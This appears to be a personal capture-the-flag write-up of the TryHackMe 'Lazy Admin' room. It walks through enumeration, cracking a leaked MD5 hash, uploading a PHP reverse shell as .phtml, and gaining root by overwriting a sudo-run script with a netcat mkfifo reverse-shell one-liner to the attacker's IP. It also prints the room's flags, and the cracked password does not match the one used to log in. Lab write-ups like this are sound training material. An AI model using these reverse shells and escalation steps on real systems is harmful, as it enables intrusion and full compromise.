# TryHackMe - Lazy Admin

## 🛠 Setup

Set an environment variable for the IP to simplify commands:

```bash
export IP=10.10.29.138
```

## 📌 Task 1: Lazy Admin

### 🔍 Nmap Scan

**Using all ports takes forver**

```bash
nmap -sC -sV -oN nmap/initial $IP
```

**Results:**

```
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)             
| ssh-hostkey:                                                                                
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)                                
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)                               
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)                             
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                           
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                  
|_http-title: Apache2 Ubuntu Default Page: It works                                           
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### 🔍 Gobuster

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.29.138 -x .php,.txt,.html
```

**Results**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 11321]
/.php                 (Status: 403) [Size: 277]
/content              (Status: 301) [Size: 314] [--> http://10.10.29.138/content/]

```
* Going to /content/ I find it's sweetrice! 
Let's update gobuster and look for stuff under /content/

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://10.10.29.138/content/ -x .php,.txt,.html

```
**Results**
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/images               (Status: 301) [Size: 321] [--> http://10.10.29.138/content/images/]
/index.php            (Status: 200) [Size: 2198]
/license.txt          (Status: 200) [Size: 15410]
/js                   (Status: 301) [Size: 317] [--> http://10.10.29.138/content/js/]
/changelog.txt        (Status: 200) [Size: 18013]
/inc                  (Status: 301) [Size: 318] [--> http://10.10.29.138/content/inc/]
/as                   (Status: 301) [Size: 317] [--> http://10.10.29.138/content/as/]
/_themes              (Status: 301) [Size: 322] [--> http://10.10.29.138/content/_themes/]
/attachment           (Status: 301) [Size: 325] [--> http://10.10.29.138/content/attachment/]
```

A quick look at changelog.txt reveals it's running version 1.5.0
Google shows some exploits but they all seem tricky. I am not sure I need cross side scripting and I do not want to use metasploit!

/inc/ is interesting. There is a SQL backup file!

Downloded that in firefox. In there is the user name and a hash

```
"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\"
```

So the user name is manager
Let's run hashcat on the hash

```bash
hashcat 42f749ade7f9e195bf475f37a44cafcb
```

**Results**
```
     # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass).md5($pass).sha1($pass))                    | Raw Hash salted and/or iterated
   4300 | md5(strtoupper(md5($pass)))                                | Raw Hash salted and/or iterated
   1000 | NTLM                                                       | Operating System
   9900 | Radmin2                                                    | Operating System
   8600 | Lotus Notes/Domino 5                                       | Enterprise Application Software (EAS)
```

It looks like it's MD5
Let's use John the Ripper to crack it

```bash
echo "42f749ade7f9e195bf475f37a44cafcb" hash
john hash -format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
```
Yikes that was quick!

```
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
Password123      (?)     
1g 0:00:00:00 DONE (2025-06-24 00:31) 100.0g/s 3360Kp/s 3360Kc/s 3360KC/s coco21..181193
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Let's login using http://10.10.29.138/content/as/
user: manager
password; password1

**We're logged in as www-root**

Have a look around and I found a way to upload a file
Lets get the reverse shell from pentestmonkey and update for my IP and port. https://pentestmonkey.net/tools/web-shells/php-reverse-shell

I tried to upload the php file but it was not allowed
However, phtml worked just fine.
File uploaded!
Let's open a listener on my box
```bash
nc -nlvp 8888
```

Now open the file I just uploaded in the web browser
** bingo, I have my reverse shell!! **

Let's get the user flag!

```bash
cat /home/itguy/user.txt
```

**Q. What is the user flag
A. THM{63e5bce9271952aad1113b6f1ac28a07}

### Now the root flag!

```bash
sudo -l
```

**results**

```
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

***what is backup.pl?
```bash
cat /home/itguy/backup.pl
```
**results**
```
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```
*I don't heve permissions to edit this file. Maybe I'll have better luck with copy.sh

**results for copy.sh**
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
```

This one I can edit but I do not have a real shell and can't open nano. I tries to stabalize the shell several times but it never worked. Just hung. **something I need to play with**
Maybe I can just echo a new file over the existing

```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.57.243 5554 > /tmp/f" > /etc/copy.sh
```

Yes that worked. Almost there!

Setup a listener on port 5554 on my host and then execute the perl command

```bash 
sudo perl /home/itguy/backup.pl
```

Bingo. I got a reverse shell and now root! Let's cat that root flag


**Q. What is the root flag
A. THM{6637f41d0177b6f37cb20d775124699f}



 
